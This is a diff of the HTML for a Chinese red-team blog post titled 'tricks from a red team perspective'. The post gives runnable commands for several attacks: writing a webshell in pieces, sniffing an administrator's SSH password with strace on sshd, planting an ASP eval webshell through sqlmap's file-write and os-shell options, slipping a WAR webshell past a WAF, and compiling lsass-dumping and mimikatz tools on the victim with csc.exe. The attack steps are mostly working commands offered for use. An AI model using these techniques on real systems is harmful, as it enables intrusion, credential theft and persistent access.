@@ -9,8 +9,7 @@
   <title>红队视角下的奇技淫巧 | Jici&#39;s Blog</title>
   <meta name="author" content="Jici">
   
-  <meta name="description" content="高限制下的木马写入
-高限制场景包括：服务器不出网（不能进行远程下载）、写木马有限制、命令长度有限制等
+  <meta name="description" content="高限制下的木马写入高限制场景包括：服务器不出网（不能进行远程下载）、写木马有限制、命令长度有限制等
 这时候采取的策略是，将木马分割成一段一段，逐段写入，最后合并文件为完整的木马文件，这同样适用于Webshell的写入。这里举一个分段写入Webshell的例子：">
   
   
@@ -162,8 +161,7 @@ var _hmt = _hmt || [];
 	<div class="mypage">		
 	  		
 
-	  <h1>高限制下的木马写入</h1>
-<p>高限制场景包括：服务器不出网（不能进行远程下载）、写木马有限制、命令长度有限制等</p>
+	  <h1 id="高限制下的木马写入"><a href="#高限制下的木马写入" class="headerlink" title="高限制下的木马写入"></a>高限制下的木马写入</h1><p>高限制场景包括：服务器不出网（不能进行远程下载）、写木马有限制、命令长度有限制等</p>
 <p>这时候采取的策略是，将木马分割成一段一段，逐段写入，最后合并文件为完整的木马文件，这同样适用于Webshell的写入。这里举一个分段写入Webshell的例子：</p>
 <pre class="line-numbers language-none"><code class="language-none">echo -e -n \&quot;&lt;?php \&quot; &gt; &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;1.txt
 
@@ -179,15 +177,13 @@ cat &#x2F;fwlib&#x2F;sys&#x2F;virus&#x2F;webui&#x2F;svpn_html&#x2F;1.txt &#x2F;f
 <p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20240327191241089.png" alt="image-20240327191241089"></p>
 <p>这里再推荐一个由这种思路产生的工具<a target="_blank" rel="noopener" href="https://github.com/corunb/Split_tools">Split_tools</a></p>
 <p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20230307093032359.png" alt="image-20230307093032359"></p>
-<h1>窃取Linux登录的账号密码</h1>
-<p>假设一个攻击场景：你的入口机器是一台Linux，并且发现所处C段大部分为Linux，此时也提权至root权限了，但因为是暴力提权上来的，你并不知道root的密码，尝试用MimiPenguin抓取密码无果，你需要获得root的密码，这有利于后续的横向（比如对同C段的其他IP机器进行撞库）。通过长期的蹲点，你发现业务管理员每周五下午会定时登录一次，有时早，有时晚（可能是人工巡检，也可能是脚本登录，但这都不重要），这时候可以<mark>使用strace命令监听管理员的密码</mark></p>
+<h1 id="窃取Linux登录的账号密码"><a href="#窃取Linux登录的账号密码" class="headerlink" title="窃取Linux登录的账号密码"></a>窃取Linux登录的账号密码</h1><p>假设一个攻击场景：你的入口机器是一台Linux，并且发现所处C段大部分为Linux，此时也提权至root权限了，但因为是暴力提权上来的，你并不知道root的密码，尝试用MimiPenguin抓取密码无果，你需要获得root的密码，这有利于后续的横向（比如对同C段的其他IP机器进行撞库）。通过长期的蹲点，你发现业务管理员每周五下午会定时登录一次，有时早，有时晚（可能是人工巡检，也可能是脚本登录，但这都不重要），这时候可以==使用strace命令监听管理员的密码==</p>
 <pre class="line-numbers language-none"><code class="language-none">(strace -f -F -p &#96;ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;&#96; -t -e trace&#x3D;read,write -s 32 2&gt; &#x2F;tmp&#x2F;sshd.log &amp;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>一段时间后，对监听的日志进行过滤查看</p>
 <pre class="line-numbers language-none"><code class="language-none">grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; &#x2F;tmp&#x2F;sshd.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>很幸运，你在这周五管理员上线的时候，捕获到了密码</p>
 <p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20240327210605721.png" alt="image-20240327210605721"></p>
-<h1>不出网的sql注入+中文web目录写webshell</h1>
-<p>假设场景：使用sqlmap扫描到当前站点存在sql注入，配合sqlmap的–os-shell参数获得了一个shell可以执行命令，但是你发现TCP/UDP均不出网，由于sqlmap提供的shell不够方便，你决定写一个webshell便于配合哥斯拉、蚁剑进行后续渗透（同时也为了更方便连接），你定位到了web目录，但是web目录是中文目录（比如：D:\网站），你尝试写入，但是写入失败了。这时候<mark>可以先在本地写好一个bat脚本（内容是在web目录某位置写入webshell），再通过sqlmap上传写好的bat脚本，最后执行这个bat脚本把webshell写入web目录</mark>，具体如下</p>
+<h1 id="不出网的sql注入-中文web目录写webshell"><a href="#不出网的sql注入-中文web目录写webshell" class="headerlink" title="不出网的sql注入+中文web目录写webshell"></a>不出网的sql注入+中文web目录写webshell</h1><p>假设场景：使用sqlmap扫描到当前站点存在sql注入，配合sqlmap的—os-shell参数获得了一个shell可以执行命令，但是你发现TCP/UDP均不出网，由于sqlmap提供的shell不够方便，你决定写一个webshell便于配合哥斯拉、蚁剑进行后续渗透（同时也为了更方便连接），你定位到了web目录，但是web目录是中文目录（比如：D:\网站），你尝试写入，但是写入失败了。这时候==可以先在本地写好一个bat脚本（内容是在web目录某位置写入webshell），再通过sqlmap上传写好的bat脚本，最后执行这个bat脚本把webshell写入web目录==，具体如下</p>
 <pre class="line-numbers language-none"><code class="language-none"># 现在本地的shell.bat中写好写入webshell的代码，内容如下
 echo ^&lt;%%eval request(&quot;pass&quot;)%%^&gt; &gt;D:\网站\shell.asp
 
@@ -196,14 +192,12 @@ python3 sqlmap.py -r request_message.txt --batch --file-write shell.bat -file-de
 
 #最后配合sqlmap的--os-shell参数获得的shell执行shell.bat，写入webshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>在站点上访问一下webshell地址，确认webshell是否访问成功</p>
-<h1>Tomcat上传war包绕过WAF</h1>
-<p>攻击场景：成功登录了Tomcat 后台，你迅速地制作了一个包含webshell的WAR包进行部署，很遗憾，被WAF拦截了。这时候可以尝试利用<code>\\\</code>拆分war后缀，绕过waf（即<mark>将文件后缀修改为xxx.w\\ar</mark>）</p>
+<h1 id="Tomcat上传war包绕过WAF"><a href="#Tomcat上传war包绕过WAF" class="headerlink" title="Tomcat上传war包绕过WAF"></a>Tomcat上传war包绕过WAF</h1><p>攻击场景：成功登录了Tomcat 后台，你迅速地制作了一个包含webshell的WAR包进行部署，很遗憾，被WAF拦截了。这时候可以尝试利用<code>\\\</code>拆分war后缀，绕过waf（即==将文件后缀修改为xxx.w\\ar==）</p>
 <p><img src="/2024/03/27/%E7%BA%A2%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/image-20240327220634008.png" alt="image-20240327220634008"></p>
-<h1>限制上传文件大小如何转储lsass.dmp</h1>
-<p>假设场景：你拿下目标机器后，想要转储lsass读取凭据以便做后续渗透，上传转储工具时发现目标机器对上传文件的大小做了限制，导致无法上传。<mark>这时候可以上传由C#编写的转储工具的源码文件，借助目标机器上默认安装的.Net环境，使用csc.exe进行编译</mark>。</p>
+<h1 id="限制上传文件大小如何转储lsass-dmp"><a href="#限制上传文件大小如何转储lsass-dmp" class="headerlink" title="限制上传文件大小如何转储lsass.dmp"></a>限制上传文件大小如何转储lsass.dmp</h1><p>假设场景：你拿下目标机器后，想要转储lsass读取凭据以便做后续渗透，上传转储工具时发现目标机器对上传文件的大小做了限制，导致无法上传。==这时候可以上传由C#编写的转储工具的源码文件，借助目标机器上默认安装的.Net环境，使用csc.exe进行编译==。</p>
 <p>可以使用这个转储工具：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/DumpLsass.cs">https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/DumpLsass.cs</a></p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="http://xn--ruu81c.Net">支持.Net</a> 3.5以及更高版本</p>
+<p>支持.Net 3.5以及更高版本</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none"># 编译
 C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe DumpLsass.cs &#x2F;unsafe
@@ -211,16 +205,13 @@ C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe DumpLsass.cs &#x2F;unsafe
 或者
 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe DumpLsass.cs &#x2F;unsafe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1>限制下载文件大小如何读取lsass.dmp</h1>
-<p>假设场景：你拿下目标机器后，想要转储lsass读取凭据以便做后续渗透，成功转储lsass.dmp文件后，决定将其下载到本地提取凭据（比如用mimikatz），但是目标机器对下载文件大小做了限制，导致无法下载lsass.dmp到本地。<mark>这时候可以转变思路，直接上传 免杀mimikatz  / C#版mimikatz源码(借助目标机器上默认安装的.Net环境，使用csc.exe进行编译) 到目标机器，直接在目标机器上提取凭据</mark>。</p>
+<h1 id="限制下载文件大小如何读取lsass-dmp"><a href="#限制下载文件大小如何读取lsass-dmp" class="headerlink" title="限制下载文件大小如何读取lsass.dmp"></a>限制下载文件大小如何读取lsass.dmp</h1><p>假设场景：你拿下目标机器后，想要转储lsass读取凭据以便做后续渗透，成功转储lsass.dmp文件后，决定将其下载到本地提取凭据（比如用mimikatz），但是目标机器对下载文件大小做了限制，导致无法下载lsass.dmp到本地。==这时候可以转变思路，直接上传 免杀mimikatz  / C#版mimikatz源码(借助目标机器上默认安装的.Net环境，使用csc.exe进行编译) 到目标机器，直接在目标机器上提取凭据==。</p>
 <p>C#版mimikatz源码可以使用这个项目：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/PELoaderofMimikatz.cs">https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/PELoaderofMimikatz.cs</a></p>
 <p>或者使用<code>转储lsass+读取凭据全流程</code>的工具，比如：</p>
 <ul>
-<li>
-<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SafetyKatz">https://github.com/GhostPack/SafetyKatz</a></p>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SafetyKatz">https://github.com/GhostPack/SafetyKatz</a></p>
 </li>
-<li>
-<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs">https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs</a></p>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs">https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs</a></p>
 </li>
 </ul>
 	  
